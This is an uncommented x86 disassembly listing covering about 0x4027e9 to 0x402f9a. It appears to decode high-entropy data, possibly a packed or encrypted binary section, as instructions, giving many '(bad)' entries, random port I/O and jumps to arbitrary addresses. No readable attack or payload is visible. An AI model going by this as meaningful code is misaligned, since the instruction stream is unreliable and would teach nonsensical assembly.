  4027e9:	lldt   WORD PTR [edi-0x9bcae7e]
  4027f0:	add    DWORD PTR [esi],ecx
  4027f2:	push   ss
  4027f3:	dec    edx
  4027f4:	dec    eax
  4027f5:	in     eax,dx
  4027f6:	xlat   BYTE PTR ds:[ebx]
  4027f7:	lods   eax,DWORD PTR ds:[esi]
  4027f8:	xchg   dl,al
  4027fa:	aaa    
  4027fb:	xlat   BYTE PTR ds:[ebx]
  4027fc:	mov    edi,DWORD PTR [edi-0x48afe43]
  402802:	fcmovb st,st(7)
  402804:	imul   DWORD PTR [ecx]
  402806:	jp     0x4027b3
  402808:	mov    esp,0xb659ea65
  40280d:	sar    BYTE PTR [edx-0x17973fbc],cl
  402813:	dec    edi
  402814:	push   0x59
  402816:	inc    DWORD PTR [ebp+0x6]
  402819:	loope  0x402854
  40281b:	mov    esi,0x3d34d1c0
  402820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402821:	sub    BYTE PTR [ebp-0x7fee445b],0x35
  402828:	mov    esi,0x5563cf29
  40282d:	push   ebp
  40282e:	(bad)  
  40282f:	mov    edx,0xcf3b0d50
  402834:	or     al,0x92
  402836:	dec    esi
  402837:	outs   dx,DWORD PTR ds:[esi]
  402838:	loopne 0x402894
  40283a:	cld    
  40283b:	ds pop ebp
  40283d:	xchg   ecx,eax
  40283e:	adc    dl,bh
  402840:	dec    esp
  402841:	das    
  402842:	or     BYTE PTR [eax],ch
  402844:	sub    edx,eax
  402846:	test   DWORD PTR [ecx-0x2eaa50a9],ebp
  40284c:	lods   eax,DWORD PTR ds:[esi]
  40284d:	fwait
  40284e:	mov    esp,DWORD PTR [eax-0x1c]
  402851:	jae    0x402882
  402853:	(bad)  
  402854:	mov    ds:0xbff4d042,al
  402859:	(bad)  
  40285b:	mov    ch,0xdf
  40285d:	test   al,0x1b
  40285f:	js     0x40285d
  402861:	inc    eax
  402862:	dec    ebp
  402863:	rcr    DWORD PTR [eax+0x581b65cf],0xfd
  40286a:	mov    bh,0x43
  40286c:	sahf   
  40286d:	fst    QWORD PTR [ecx]
  40286f:	mov    ecx,0x970f99f6
  402874:	mov    WORD PTR [eax-0x28],?
  402877:	mov    esp,0x93c4c906
  40287c:	pop    eax
  40287d:	das    
  40287e:	dec    eax
  40287f:	rcl    DWORD PTR [ebp-0x22000cc4],1
  402885:	pusha  
  402886:	call   0xfcbf7f7a
  40288b:	popa   
  40288c:	jno    0x4028bf
  40288e:	int    0x19
  402890:	push   es
  402891:	inc    edx
  402892:	push   0x7240ba57
  402897:	stc    
  402898:	stos   DWORD PTR es:[edi],eax
  402899:	mov    esp,0xcdd8abae
  40289e:	mov    esp,0x7fa94f36
  4028a3:	lea    ebp,[edi+0x2e]
  4028a6:	jo     0x40286f
  4028a8:	xor    ecx,ebx
  4028aa:	clc    
  4028ab:	jl     0x402852
  4028ad:	mov    edx,0x5039c9b5
  4028b2:	cs sahf 
  4028b4:	call   0xb49dbd7
  4028b9:	fidiv  WORD PTR [ecx+0x6e]
  4028bc:	inc    ebx
  4028bd:	inc    edx
  4028be:	sbb    DWORD PTR [ebp-0x5aff11b5],eax
  4028c4:	pop    esi
  4028c5:	xor    al,0x2
  4028c7:	rcl    DWORD PTR [ebp+eiz*1+0x10b0a265],cl
  4028ce:	stos   BYTE PTR es:[edi],al
  4028cf:	mov    al,0x20
  4028d1:	dec    eax
  4028d2:	pop    eax
  4028d3:	cld    
  4028d4:	cmp    esi,DWORD PTR [esi-0x56488b54]
  4028da:	mov    DWORD PTR [esi],edi
  4028dc:	enter  0xcdf9,0xb2
  4028e0:	popa   
  4028e1:	jns    0x4028b2
  4028e3:	in     al,dx
  4028e4:	ds ja  0x40286e
  4028e7:	repz pop ds
  4028e9:	cmp    al,0x1
  4028eb:	mov    al,0xf5
  4028ed:	test   eax,0xd3b6cd5b
  4028f2:	sub    bl,BYTE PTR [ebx+ebx*8+0x7b]
  4028f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028f7:	retf   
  4028f8:	je     0x4028a9
  4028fa:	pop    edi
  4028fb:	push   cs
  4028fc:	and    BYTE PTR [eax],bh
  4028fe:	mov    eax,0xcedbd68c
  402903:	push   esi
  402904:	jge    0x4028a6
  402906:	test   al,0xe0
  402908:	pop    ss
  402909:	daa    
  40290a:	mov    bh,0x78
  40290c:	aaa    
  40290d:	into   
  40290e:	and    eax,0xf94a2a2
  402913:	mov    cl,BYTE PTR ds:[edi+ecx*4-0x6a34209f]
  40291b:	dec    esi
  40291c:	outs   dx,DWORD PTR ds:[esi]
  40291d:	in     eax,0x14
  40291f:	jns    0x40296f
  402921:	lea    esp,[edx+0x6f656cb4]
  402927:	popa   
  402928:	pushf  
  402929:	aas    
  40292a:	or     DWORD PTR ds:0xfe5ed5c0,edi
  402930:	test   eax,0x641f8568
  402935:	cmp    DWORD PTR [edi+0x3daa6e0c],esp
  40293b:	(bad)  
  40293c:	cmp    esi,ecx
  40293e:	(bad)  
  40293f:	lahf   
  402940:	mov    bl,0x7f
  402942:	js     0x402954
  402944:	out    dx,eax
  402945:	sub    al,BYTE PTR ds:0xe0243d44
  40294b:	mov    al,ds:0xdf5adafe
  402950:	jg     0x4028e6
  402952:	in     eax,dx
  402953:	pop    ss
  402954:	mov    ebx,0x711881bf
  402959:	js     0x402992
  40295b:	mov    al,ds:0x96d5ed9
  402960:	ffree  st(7)
  402962:	in     eax,0x29
  402964:	je     0x40297d
  402966:	add    esp,DWORD PTR [edi+0x63]
  402969:	neg    BYTE PTR [eax+0x2ce368eb]
  40296f:	inc    esi
  402970:	ret    
  402971:	inc    ebp
  402972:	lods   al,BYTE PTR ds:[esi]
  402973:	mov    BYTE PTR [edi+edi*2],0x5a
  402977:	add    DWORD PTR [ecx+0x48a6c074],eax
  40297d:	fdiv   QWORD PTR [ecx]
  40297f:	inc    esi
  402980:	aad    0xd8
  402982:	push   edi
  402983:	out    0x7f,eax
  402985:	ins    DWORD PTR es:[edi],dx
  402986:	fwait
  402987:	rcl    BYTE PTR [ebx-0x6de7fa44],cl
  40298d:	and    al,BYTE PTR [esi-0x45]
  402990:	(bad)  
  402991:	aam    0xb9
  402993:	adc    eax,0x27f27144
  402998:	push   cs
  402999:	sub    BYTE PTR [edi+ebp*8+0x5f],bh
  40299d:	add    al,0x30
  40299f:	dec    ebx
  4029a0:	inc    ebp
  4029a1:	mov    eax,ds:0x900ede98
  4029a6:	std    
  4029a7:	cdq    
  4029a8:	push   0x11f6c8f
  4029ad:	gs jno 0x40297b
  4029b0:	inc    ebx
  4029b1:	out    dx,al
  4029b2:	(bad)  
  4029b3:	(bad)  
  4029b4:	outs   dx,BYTE PTR ds:[esi]
  4029b5:	mov    WORD PTR [esi+edx*4],gs
  4029b8:	sti    
  4029b9:	jns    0x4029da
  4029bb:	xor    eax,0x8aa29f96
  4029c0:	pop    ds
  4029c1:	lea    ebx,[eax]
  4029c3:	xor    ebp,DWORD PTR [edi]
  4029c5:	or     al,0x6e
  4029c7:	or     BYTE PTR [ecx],bl
  4029c9:	mov    WORD PTR [edx+edx*8-0x4842195f],cs
  4029d0:	hlt    
  4029d1:	sbb    eax,0xbce71be4
  4029d6:	inc    esi
  4029d7:	adc    BYTE PTR [ebx+0x7f005d42],0x51
  4029de:	mov    edi,DWORD PTR [ecx]
  4029e0:	push   es
  4029e1:	es out dx,al
  4029e3:	shl    dl,1
  4029e5:	pop    ss
  4029e6:	mov    al,bh
  4029e8:	clc    
  4029e9:	dec    edx
  4029ea:	popf   
  4029eb:	test   al,0x85
  4029ed:	push   ss
  4029ee:	out    dx,eax
  4029ef:	mov    esp,0x8c3b6446
  4029f4:	xchg   edx,eax
  4029f5:	add    eax,DWORD PTR [edx-0x2b]
  4029f8:	ret    
  4029f9:	mov    esi,0x3a883f5b
  4029fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029ff:	mov    edx,DWORD PTR [ebp-0xea464dc]
  402a05:	lods   al,BYTE PTR ds:[esi]
  402a06:	frstor [esi+0x79]
  402a09:	popf   
  402a0a:	cdq    
  402a0b:	cmp    eax,0x9065db3d
  402a10:	fwait
  402a11:	add    al,0x22
  402a13:	(bad)  
  402a14:	push   esp
  402a15:	xchg   edx,eax
  402a16:	jb     0x402a8b
  402a18:	into   
  402a19:	inc    bp
  402a1b:	mov    cl,0xd5
  402a1d:	pop    eax
  402a1e:	shl    DWORD PTR [ebp-0x14],cl
  402a21:	cmp    DWORD PTR [esi+0x62043db9],eax
  402a27:	push   eax
  402a28:	aaa    
  402a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a2a:	or     al,0xee
  402a2c:	pop    esi
  402a2d:	sub    eax,0xeaecbd3d
  402a32:	je     0x402a1d
  402a34:	sub    DWORD PTR [ebp+0x251b3e6c],ebp
  402a3a:	stc    
  402a3b:	cmp    ecx,edx
  402a3d:	scas   al,BYTE PTR es:[edi]
  402a3e:	addr16 fcomip st,st(6)
  402a41:	shl    DWORD PTR [eax],0xbe
  402a44:	xchg   ecx,eax
  402a45:	sbb    esi,DWORD PTR [ebx+0x44]
  402a48:	push   esi
  402a49:	mov    ebp,0x4c690776
  402a4e:	imul   esp,DWORD PTR ds:0xea25c62,0xffffffd5
  402a55:	mov    edx,cs
  402a57:	ja     0x402a65
  402a59:	or     eax,0xf8c19eb9
  402a5e:	ja     0x402a72
  402a60:	bound  edx,QWORD PTR [ebx-0xb468596]
  402a66:	(bad)  
  402a67:	sbb    BYTE PTR [edx],0x3a
  402a6a:	in     al,dx
  402a6b:	fisttp DWORD PTR gs:[ebp+0x33fea800]
  402a72:	add    al,0x1d
  402a74:	mov    ecx,0x54f5f0c3
  402a79:	and    al,0x6b
  402a7b:	mov    WORD PTR [ebp-0x61],fs
  402a7e:	shr    DWORD PTR [ebx],0x76
  402a81:	inc    edi
  402a82:	jbe    0x402ac0
  402a84:	aaa    
  402a85:	add    eax,0xb41adc93
  402a8a:	add    al,0x40
  402a8c:	mov    al,ds:0xc733bbd1
  402a91:	jl     0x402b01
  402a93:	das    
  402a94:	inc    ebp
  402a95:	ret    0xc504
  402a98:	stos   BYTE PTR es:[edi],al
  402a99:	aas    
  402a9a:	push   0xe3b01c79
  402a9f:	mov    cl,0xe2
  402aa1:	scas   eax,DWORD PTR es:[edi]
  402aa2:	sbb    ebx,DWORD PTR [ebx]
  402aa4:	pop    esp
  402aa5:	cmp    edi,DWORD PTR [ebx]
  402aa7:	dec    esp
  402aa8:	rcr    DWORD PTR [ebp+0x2a],0x33
  402aac:	mov    BYTE PTR [ecx+0x42a3310d],0x0
  402ab3:	dec    ebp
  402ab4:	mov    ds:0x6e90042,eax
  402ab9:	add    eax,0xd2cc0000
  402abe:	cmp    eax,0xd9db3dc4
  402ac3:	fidivr DWORD PTR [esi]
  402ac5:	icebp  
  402ac6:	out    0xdb,al
  402ac8:	jl     0x402afc
  402aca:	std    
  402acb:	mov    fs,WORD PTR [edx+0x6a787810]
  402ad1:	jl     0x402b4b
  402ad3:	js     0x402b27
  402ad5:	lods   al,BYTE PTR ds:[esi]
  402ad6:	nop
  402ad7:	cdq    
  402ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ad9:	add    edi,ebp
  402adb:	imul   BYTE PTR [edi]
  402add:	das    
  402ade:	int    0x96
  402ae0:	cmc    
  402ae1:	call   0xe407:0x39060adb
  402ae8:	call   0xe5c2a0e0
  402aed:	pop    esi
  402aee:	imul   esi,DWORD PTR [edx-0x1236e3f4],0xd1fe713f
  402af8:	outs   dx,BYTE PTR ds:[esi]
  402af9:	aaa    
  402afa:	push   esp
  402afb:	mov    dl,0xee
  402afd:	enter  0x912e,0x2e
  402b01:	inc    ebp
  402b02:	dec    eax
  402b03:	mov    esi,gs
  402b05:	in     eax,dx
  402b06:	out    0x19,eax
  402b08:	sbb    esi,0x155be7a4
  402b0e:	and    BYTE PTR [ebx],dl
  402b10:	stos   DWORD PTR es:[edi],eax
  402b11:	pop    es
  402b12:	xchg   edx,eax
  402b13:	pop    ds
  402b14:	out    dx,eax
  402b15:	dec    ecx
  402b16:	sub    cl,bh
  402b18:	(bad)  
  402b19:	scas   eax,DWORD PTR es:[edi]
  402b1a:	xchg   edi,eax
  402b1b:	pop    esi
  402b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b1d:	dec    esp
  402b1e:	popf   
  402b1f:	je     0x402b8b
  402b21:	ss push edi
  402b23:	scas   al,BYTE PTR es:[edi]
  402b24:	pminsw mm0,QWORD PTR [edx+0x79]
  402b28:	(bad)  
  402b29:	hlt    
  402b2a:	sbb    al,0x18
  402b2c:	outs   dx,BYTE PTR ds:[esi]
  402b2d:	ja     0x402b1d
  402b2f:	mov    cl,0x1a
  402b31:	bound  edi,QWORD PTR [ecx+0x2f454a3]
  402b37:	sbb    BYTE PTR [edi+0x4ebe5fa1],bl
  402b3d:	pop    es
  402b3e:	sbb    esp,esp
  402b40:	gs push eax
  402b42:	in     al,0xb8
  402b44:	or     dl,ch
  402b46:	shl    DWORD PTR [esp+edx*8-0x389f162f],0x4d
  402b4e:	jecxz  0x402b04
  402b50:	mov    dl,0x49
  402b52:	sbb    eax,0x725f9ab9
  402b57:	and    BYTE PTR [edx-0x797df95f],0xd2
  402b5e:	mov    ss,WORD PTR [edi+edi*4-0x2b]
  402b62:	ds inc ebx
  402b64:	jmp    0x9fd35b77
  402b69:	and    eax,DWORD PTR [edx+0x1baffd03]
  402b6f:	jg     0x402b7c
  402b71:	cdq    
  402b72:	pop    es
  402b73:	ins    BYTE PTR es:[edi],dx
  402b74:	stos   BYTE PTR es:[edi],al
  402b75:	dec    edi
  402b76:	les    ecx,FWORD PTR fs:[ebp+0x18b40590]
  402b7d:	mov    ebp,0x4145ee5
  402b82:	or     dl,BYTE PTR ds:0x20da7436
  402b88:	int3   
  402b89:	xchg   BYTE PTR [ebp-0x58b83c6],al
  402b8f:	repnz imul eax,DWORD PTR [eax],0xe946df41
  402b96:	test   DWORD PTR [ecx+eiz*2+0x3c],eax
  402b9a:	lods   al,BYTE PTR es:[esi]
  402b9c:	daa    
  402b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b9e:	stos   BYTE PTR es:[edi],al
  402b9f:	xchg   edi,eax
  402ba0:	retf   
  402ba1:	sub    ecx,DWORD PTR [ebx]
  402ba3:	inc    eax
  402ba4:	pop    ebx
  402ba5:	sbb    DWORD PTR [ecx],ecx
  402ba7:	jns    0x402bf5
  402ba9:	pop    eax
  402baa:	aad    0x35
  402bac:	xchg   esi,eax
  402bad:	mov    esp,0xf790221f
  402bb2:	dec    ebx
  402bb3:	mov    eax,ds:0x2e966498
  402bb8:	cmp    DWORD PTR [edx+0x2c],ecx
  402bbb:	sub    BYTE PTR [ecx],cl
  402bbd:	loopne 0x402bf2
  402bbf:	dec    edi
  402bc0:	in     al,0x8f
  402bc2:	pop    ebp
  402bc3:	xlat   BYTE PTR ds:[ebx]
  402bc4:	or     ebx,DWORD PTR [ebp+0x31263b5e]
  402bca:	das    
  402bcb:	adc    al,0x6c
  402bcd:	dec    edi
  402bce:	adc    DWORD PTR es:[ebx-0x3c550cd5],ebx
  402bd5:	pop    edi
  402bd6:	aad    0xfa
  402bd8:	adc    BYTE PTR [edi-0x231d0bee],ch
  402bde:	push   edx
  402bdf:	xchg   edx,eax
  402be0:	ret    
  402be1:	sub    bl,BYTE PTR [esi+0x652c45f1]
  402be7:	hlt    
  402be8:	mov    BYTE PTR [eax],dl
  402bea:	mov    esi,0x8e66154d
  402bef:	mov    dh,0x9a
  402bf1:	fwait
  402bf2:	out    0x8b,eax
  402bf4:	dec    esp
  402bf5:	sbb    ah,al
  402bf7:	or     DWORD PTR [ebp-0x14],eax
  402bfa:	xchg   ecx,eax
  402bfb:	push   cs
  402bfc:	sbb    DWORD PTR [esi+0x6e],ecx
  402bff:	jbe    0x402c37
  402c01:	data16 ficom DWORD PTR [edx+0x4ec73209]
  402c08:	adc    ebx,DWORD PTR [edi-0x496a48ed]
  402c0e:	xor    al,0xce
  402c10:	and    BYTE PTR [ebp-0x54],0xbc
  402c14:	jno    0x402bbf
  402c16:	mov    edx,0xb740289a
  402c1b:	lock and BYTE PTR [ebx+0x4c],ch
  402c1f:	retf   
  402c20:	out    0xdf,eax
  402c22:	fild   DWORD PTR [ebx-0x55ada738]
  402c28:	or     al,0xe3
  402c2a:	xchg   ebx,eax
  402c2b:	gs js  0x402c7d
  402c2e:	xor    BYTE PTR [edx],ch
  402c30:	jb     0x402c52
  402c32:	test   BYTE PTR [ebx-0x51fdc9e6],dh
  402c38:	fnsave [esi+edi*4-0x14f8c8fb]
  402c3f:	pop    ebp
  402c40:	add    al,0x10
  402c42:	cmc    
  402c43:	xchg   ecx,eax
  402c44:	adc    DWORD PTR [ebx-0x1066bb69],esi
  402c4a:	xlat   BYTE PTR ds:[ebx]
  402c4b:	fisubr DWORD PTR [ebp+edi*2-0x9]
  402c4f:	stc    
  402c50:	data16 jle 0x402ca8
  402c53:	fsubr  DWORD PTR [ebp+ebp*1-0x62]
  402c57:	mov    eax,ds:0xc718903c
  402c5c:	imul   ebp,esp,0x1ffa0a3d
  402c62:	mov    dh,0x3a
  402c64:	mov    esp,0xacb8c099
  402c69:	inc    ebx
  402c6a:	js     0x402ce6
  402c6c:	xor    eax,ecx
  402c6e:	mov    eax,ds:0xd7358a82
  402c73:	test   DWORD PTR [eax],ebx
  402c75:	stos   DWORD PTR es:[edi],eax
  402c76:	ret    
  402c77:	dec    edi
  402c78:	outs   dx,BYTE PTR ds:[esi]
  402c79:	int3   
  402c7a:	sahf   
  402c7b:	sbb    edx,DWORD PTR [ebp-0xa02f18b]
  402c81:	cdq    
  402c82:	cld    
  402c83:	cmp    BYTE PTR [ebx],al
  402c85:	adc    bl,BYTE PTR [edi]
  402c87:	pop    esi
  402c88:	into   
  402c89:	sbb    DWORD PTR [ebp-0x301f2115],0x8b520c6c
  402c93:	fs cli 
  402c95:	data16 aaa 
  402c97:	mov    eax,ds:0xda5b21a8
  402c9c:	cmp    BYTE PTR [ebp+0x63],dl
  402c9f:	sbb    BYTE PTR [ebp+0x3ecddbe4],0x6e
  402ca6:	int    0x19
  402ca8:	mov    esp,0x93cd7db5
  402cad:	mov    eax,0x52119af1
  402cb2:	jecxz  0x402ca0
  402cb4:	inc    esi
  402cb5:	mov    DWORD PTR [edi],ebp
  402cb7:	adc    al,0x66
  402cb9:	sbb    DWORD PTR [ebx-0x54],0x5
  402cbd:	cmc    
  402cbe:	cmc    
  402cbf:	inc    ch
  402cc1:	imul   esp,ebp,0x4901f33a
  402cc7:	mov    ds:0xec296eb7,eax
  402ccc:	and    esp,DWORD PTR [ebx+0x6b]
  402ccf:	or     BYTE PTR [edi],bh
  402cd1:	iret   
  402cd2:	ins    DWORD PTR es:[edi],dx
  402cd3:	call   0x2a1cadb3
  402cd8:	jae    0x402c87
  402cda:	jp     0x402c65
  402cdc:	jno    0x402d31
  402cde:	dec    ebp
  402cdf:	mov    WORD PTR [esi-0x61],?
  402ce2:	xlat   BYTE PTR ds:[ebx]
  402ce3:	push   ss
  402ce4:	outs   dx,DWORD PTR ds:[esi]
  402ce5:	not    BYTE PTR [edi-0x69]
  402ce8:	sbb    BYTE PTR [ecx+0x42fbc35f],bl
  402cee:	je     0x402c94
  402cf0:	or     ebx,DWORD PTR [ecx+0x71]
  402cf3:	stos   DWORD PTR es:[edi],eax
  402cf4:	mov    edx,0xc318c28e
  402cf9:	test   BYTE PTR [esi],al
  402cfb:	push   edi
  402cfc:	jae    0x402cca
  402cfe:	fsub   st(4),st
  402d00:	popf   
  402d01:	sbb    eax,DWORD PTR [edi-0x166b1162]
  402d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d08:	pop    DWORD PTR [edi-0x3]
  402d0b:	fs xchg ecx,eax
  402d0d:	shl    DWORD PTR [ecx+0x58],cl
  402d10:	and    DWORD PTR [ebp+0x972fbd0],0x744d75d4
  402d1a:	ret    0x532e
  402d1d:	xor    ecx,ecx
  402d1f:	inc    esi
  402d20:	inc    esp
  402d21:	sub    ebx,DWORD PTR [edx-0x14]
  402d24:	push   eax
  402d25:	jge    0x402d4f
  402d27:	cmp    ah,cl
  402d29:	add    al,BYTE PTR [edi+0x4c47a54a]
  402d2f:	and    al,0xb2
  402d31:	outs   dx,DWORD PTR ds:[esi]
  402d32:	leave  
  402d33:	sub    DWORD PTR [esi+0x3cb7a584],edx
  402d39:	pop    esi
  402d3a:	cmp    cl,dl
  402d3c:	shl    ah,cl
  402d3e:	cmp    BYTE PTR [edi-0x66],bh
  402d41:	fisubr WORD PTR [edi-0x3c]
  402d44:	ja     0x402d9c
  402d46:	int    0x65
  402d48:	sahf   
  402d49:	out    dx,eax
  402d4a:	shl    ah,1
  402d4c:	ss jo  0x402cf3
  402d4f:	aaa    
  402d50:	xchg   DWORD PTR [esi-0x5a],edx
  402d53:	mov    dh,bl
  402d55:	cmp    esi,esp
  402d57:	push   esp
  402d58:	add    dl,bl
  402d5a:	mov    ecx,0xa83eb7b2
  402d5f:	cld    
  402d60:	test   DWORD PTR [edx+0x72],ecx
  402d63:	repnz add al,BYTE PTR [eax+eax*2]
  402d67:	call   0xef1b50a9
  402d6c:	push   edx
  402d6d:	dec    eax
  402d6e:	out    0x4a,eax
  402d70:	and    BYTE PTR [ebp+0x48],dh
  402d73:	lods   eax,DWORD PTR ds:[esi]
  402d74:	push   esi
  402d75:	adc    BYTE PTR [edx+0x78bb9d04],bh
  402d7b:	icebp  
  402d7c:	adc    ch,BYTE PTR [esi-0x5c]
  402d7f:	mov    ebp,0xd0823090
  402d84:	test   al,0x86
  402d86:	pop    es
  402d87:	mov    dx,0x9509
  402d8b:	pop    esp
  402d8c:	sub    esi,ebx
  402d8e:	out    dx,eax
  402d8f:	ds push ebp
  402d91:	jmp    0xaa1e1ae3
  402d96:	push   esi
  402d97:	cmp    dl,dh
  402d99:	add    eax,0xf88a34d2
  402d9e:	jmp    0x402dc9
  402da0:	shl    DWORD PTR [edi-0x71],cl
  402da3:	lock cmp DWORD PTR [ecx-0x32],esi
  402da7:	or     bl,bl
  402da9:	fwait
  402daa:	inc    edx
  402dab:	or     ah,BYTE PTR ds:0xdf8fa077
  402db1:	add    bh,cl
  402db3:	pop    esp
  402db4:	and    al,0x24
  402db6:	idiv   BYTE PTR [ebp+0x8121732]
  402dbc:	add    ebp,DWORD PTR [edx+edx*8]
  402dbf:	fcomip st,st(2)
  402dc1:	scas   eax,DWORD PTR es:[edi]
  402dc2:	dec    esi
  402dc3:	(bad)  [ebx]
  402dc5:	inc    esp
  402dc6:	push   edx
  402dc7:	outs   dx,BYTE PTR ds:[esi]
  402dc8:	in     al,dx
  402dc9:	sub    eax,0xbc1619b0
  402dce:	mov    eax,0xc17d5266
  402dd3:	and    al,0x10
  402dd5:	out    0xec,al
  402dd7:	jbe    0x402d7d
  402dd9:	lods   eax,DWORD PTR ds:[esi]
  402dda:	popa   
  402ddb:	dec    esi
  402ddc:	sub    dl,BYTE PTR [edi]
  402dde:	inc    ebx
  402ddf:	jnp    0x402d7c
  402de1:	daa    
  402de2:	loope  0x402dfa
  402de4:	dec    edx
  402de5:	fld    TBYTE PTR [eax]
  402de7:	test   al,0x76
  402de9:	retf   0x16b5
  402dec:	popf   
  402ded:	retf   
  402dee:	xchg   edx,eax
  402def:	arpl   WORD PTR [ebx-0x46],bx
  402df2:	(bad)  
  402df3:	fcmove st,st(2)
  402df5:	mov    WORD PTR [ecx+0x4113570],gs
  402dfb:	sub    dl,dh
  402dfd:	cli    
  402dfe:	or     esp,DWORD PTR [eax+0x7504d245]
  402e04:	sbb    edi,DWORD PTR [esi+0x25]
  402e07:	or     al,0xea
  402e09:	sub    ch,cl
  402e0b:	(bad)  
  402e0c:	mov    bh,0xfb
  402e0e:	mov    esi,0x1d65749
  402e13:	test   al,0x3a
  402e15:	inc    ebp
  402e16:	sbb    ax,0x96ce
  402e1a:	ja     0x402e0e
  402e1c:	scas   al,BYTE PTR es:[edi]
  402e1d:	or     BYTE PTR [edi-0x42de35e4],dl
  402e23:	lock jl 0x402e50
  402e26:	scas   al,BYTE PTR es:[edi]
  402e27:	mov    dh,0xcd
  402e29:	je     0x402e0b
  402e2b:	std    
  402e2c:	mov    ch,BYTE PTR [ecx-0x58]
  402e2f:	push   0x65
  402e31:	out    dx,eax
  402e32:	mov    ah,BYTE PTR [edx]
  402e34:	hlt    
  402e35:	ret    0x3a7b
  402e38:	mov    eax,ds:0x41eefcbf
  402e3d:	adc    eax,0x678fd7e1
  402e42:	or     DWORD PTR [esi-0x2792ec01],edx
  402e48:	push   ebx
  402e49:	outs   dx,BYTE PTR ds:[esi]
  402e4a:	mov    ch,0xa6
  402e4c:	sar    DWORD PTR [ebp+ecx*2-0x7c],1
  402e50:	test   DWORD PTR [edx+0x4c8f3fd4],edi
  402e56:	popa   
  402e57:	jb     0x402e56
  402e59:	icebp  
  402e5a:	pop    esi
  402e5b:	cmp    al,0x7a
  402e5d:	and    al,0x6
  402e5f:	push   ecx
  402e60:	call   0x4d6d:0xd0ca31f0
  402e67:	mov    DWORD PTR [ecx+0x30],edx
  402e6a:	mov    eax,0x2e7928c2
  402e6f:	out    0xbd,al
  402e71:	jmp    0x9db3:0x7c07cbeb
  402e78:	xchg   edx,eax
  402e79:	sbb    eax,0x4f0f2252
  402e7e:	es cwde 
  402e80:	(bad)  
  402e81:	mov    eax,0x3fd9521b
  402e86:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e88:	pop    es
  402e89:	lods   al,BYTE PTR ds:[esi]
  402e8a:	add    eax,0x3e4ce367
  402e8f:	jecxz  0x402e3a
  402e91:	add    al,0xa1
  402e93:	or     DWORD PTR [edi+0x3d],eax
  402e96:	push   ebx
  402e97:	stos   BYTE PTR es:[edi],al
  402e98:	rcr    dh,cl
  402e9a:	in     eax,0x67
  402e9c:	shl    DWORD PTR [ebx+0x7d],cl
  402e9f:	jmp    FWORD PTR [esi-0x4d]
  402ea2:	sub    BYTE PTR [ebx+0x3c],dl
  402ea5:	pop    edi
  402ea6:	xor    ah,0xf
  402ea9:	xor    esp,ecx
  402eab:	fcmovnu st,st(7)
  402ead:	fldenv [esi]
  402eaf:	scas   eax,DWORD PTR es:[edi]
  402eb0:	or     DWORD PTR [ebp-0x31f326ec],edx
  402eb6:	sbb    eax,0x96fb4483
  402ebb:	in     al,0x41
  402ebd:	stc    
  402ebe:	mov    ds:0xc7750344,eax
  402ec3:	jmp    0xc579bfb0
  402ec8:	(bad)  
  402ec9:	pushf  
  402eca:	pop    eax
  402ecb:	inc    esi
  402ecc:	data16 mov ch,BYTE PTR [edi-0x79e999fc]
  402ed3:	(bad)  
  402ed4:	sbb    eax,0xdc2e1b70
  402ed9:	and    eax,DWORD PTR [edx+0x7c]
  402edc:	push   esp
  402edd:	in     eax,dx
  402ede:	mov    al,ds:0x52bc560a
  402ee3:	ret    0x1ea2
  402ee6:	push   esp
  402ee7:	ret    
  402ee8:	push   ebp
  402ee9:	les    esi,FWORD PTR [esi+ebp*4-0x17]
  402eed:	pop    edi
  402eee:	(bad)  
  402eef:	fisub  WORD PTR [esp+ecx*1+0x6f7845ff]
  402ef6:	xor    eax,0x9642bf1b
  402efb:	aas    
  402efc:	add    ebp,ecx
  402efe:	dec    edx
  402eff:	shr    DWORD PTR [ebp-0x302179eb],cl
  402f05:	stc    
  402f06:	xor    dl,BYTE PTR [ebx]
  402f08:	popf   
  402f09:	sub    ah,BYTE PTR [edi+ebp*4+0x4d142290]
  402f10:	dec    ebp
  402f11:	shr    DWORD PTR [esi+eax*4+0x74c8dfca],cl
  402f18:	mov    ebp,0xd4af5506
  402f1d:	push   ss
  402f1e:	xor    esi,DWORD PTR [edx+0x19]
  402f21:	mov    dh,ah
  402f23:	enter  0x95f3,0x29
  402f27:	pop    ebp
  402f28:	(bad)  
  402f29:	in     al,dx
  402f2a:	xlat   BYTE PTR ds:[ebx]
  402f2b:	cmp    BYTE PTR [ebp+0x19],dh
  402f2e:	out    0x1a,eax
  402f30:	repnz test eax,0xeb45ac12
  402f36:	jmp    0x108700b1
  402f3b:	je     0x402f3e
  402f3d:	push   edx
  402f3e:	cmc    
  402f3f:	or     cl,BYTE PTR [ebp+0x4d]
  402f42:	mov    esi,DWORD PTR [eax+ebx*4]
  402f45:	fstp   QWORD PTR [ebx-0x7f]
  402f48:	test   al,0xb3
  402f4a:	sub    al,0x31
  402f4c:	xor    al,BYTE PTR [eax+0x7aa783d7]
  402f52:	leave  
  402f53:	stc    
  402f54:	sub    BYTE PTR ds:0x8352a931,al
  402f5a:	jbe    0x402f4f
  402f5c:	cmc    
  402f5d:	adc    cl,dl
  402f5f:	rcr    bl,cl
  402f61:	ja     0x402f5a
  402f63:	ja     0x402fd1
  402f65:	fisubr DWORD PTR [ecx-0x13]
  402f68:	test   eax,0xc7904cd9
  402f6d:	and    DWORD PTR [ecx],0xdf855e0c
  402f73:	das    
  402f74:	jmp    0x402f2d
  402f76:	dec    ebp
  402f77:	mov    ecx,0x95f05a03
  402f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f7d:	retf   0x150e
  402f80:	mov    edi,0xd10bd50b
  402f85:	stos   DWORD PTR es:[edi],eax
  402f86:	aam    0xf5
  402f88:	jno    0x402f52
  402f8a:	clc    
  402f8b:	loop   0x402f63
  402f8d:	sub    dh,BYTE PTR [ebx+edx*2+0x11]
  402f91:	cwde   
  402f92:	push   edi
  402f93:	pop    esp
  402f94:	push   DWORD PTR [ebx+0x2f]
  402f97:	nop
  402f98:	aad    0xa3
  402f9a:	out    dx,eax
